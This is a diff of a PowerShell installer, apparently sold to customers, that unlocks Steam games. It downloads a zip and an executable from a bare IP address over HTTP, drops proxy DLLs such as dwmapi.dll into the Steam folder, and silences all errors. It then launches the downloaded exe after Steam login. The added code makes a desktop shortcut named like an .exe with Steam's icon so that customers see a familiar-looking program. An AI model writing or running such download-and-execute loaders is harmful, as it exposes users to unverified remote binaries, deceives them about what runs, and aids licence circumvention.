@@ -9,12 +9,13 @@ $ErrorActionPreference = 'SilentlyContinue'
 
 # ========== 配置区 ==========
 $ZipUrl = "http://47.100.104.45/files/patch.zip"
-$ActivatorUrl = "http://47.100.104.45/files/游戏激活程序.exe"
+# 【修改点 1】：下载链接改为英文文件名，100% 兼容所有客户网络环境
+$ActivatorUrl = "http://47.100.104.45/files/steam_activator.exe"
 $TempZip = "$env:TEMP\steam_patch.zip"
 $TempUnzip = "$env:TEMP\steam_patch_temp"
 $CopyList = @("config","dwmapi.dll","OpenSteamTool.dll","xinput1_4.dll","steam.cfg","opensteamtool.toml")
 $InstallDir = [Environment]::GetFolderPath("Desktop")
-$ActivatorFileName = "游戏激活程序.exe"
+$ActivatorFileName = "steam_activator.exe"
 # ============================
 
 # ===== 补丁安装逻辑 =====
@@ -105,7 +106,7 @@ if($installComplete){
 }
 Write-Host "=====================================`n" -ForegroundColor Cyan
 
-# ========== 下载安装最新版激活程序 (直接放到桌面) ==========
+# ========== 下载最新版激活程序 ==========
 $activatorExePath = Join-Path $InstallDir $ActivatorFileName
 try {
     $webClient.DownloadFile($ActivatorUrl, $activatorExePath)
@@ -118,14 +119,29 @@ try {
     }
 }
 
-# ========== 启动Steam + 【核心修正】等待真正的主界面 + 自动弹出 EXE ==========
+# ========== 【修改点 2】：创建客户眼中的中文快捷方式 ==========
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$shortcutPath = Join-Path $desktopPath "游戏激活程序.exe"
+try {
+    $WshShell = New-Object -comObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
+    # 指向刚刚下载的英文名 exe
+    $Shortcut.TargetPath = $activatorExePath
+    
+    $steamExePath = Join-Path $SteamRoot "steam.exe"
+    if (Test-Path $steamExePath) {
+        $Shortcut.IconLocation = "$steamExePath, 0"
+    }
+    $Shortcut.Save()
+} catch {}
+
+# ========== 启动Steam + 等待主界面 + 自动弹出 EXE ==========
 Start-Process "$SteamRoot\steam.exe"
-Write-Host "⏳ Steam已启动，正在等待【请登录steam】..." -ForegroundColor Cyan
+Write-Host "⏳ Steam已启动，正在等待【请登录Steam】..." -ForegroundColor Cyan
 
 $waitCounter = 0
 while ($waitCounter -lt 30) {
     $winTitle = (Get-Process steam -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle } | Select-Object -First 1).MainWindowTitle
-    # 【逻辑修复】：只等待进入“库/商店/社区”这些主界面特征，避免在“登录界面”过早启动 EXE
     if ($winTitle -match "库|商店|Library|Store|社区|Community") {
         break
     }
@@ -135,7 +151,7 @@ while ($waitCounter -lt 30) {
 Start-Sleep -Seconds 1
 
 if (Test-Path $activatorExePath) {
-    # 去掉 -WindowStyle Hidden，EXE 自带静默属性，保证启动成功
+    # 启动实际的 exe
     Start-Process $activatorExePath
 } else {
     Write-Host "⚠️ WARNING: 激活工具不存在，请检查桌面" -ForegroundColor Yellow
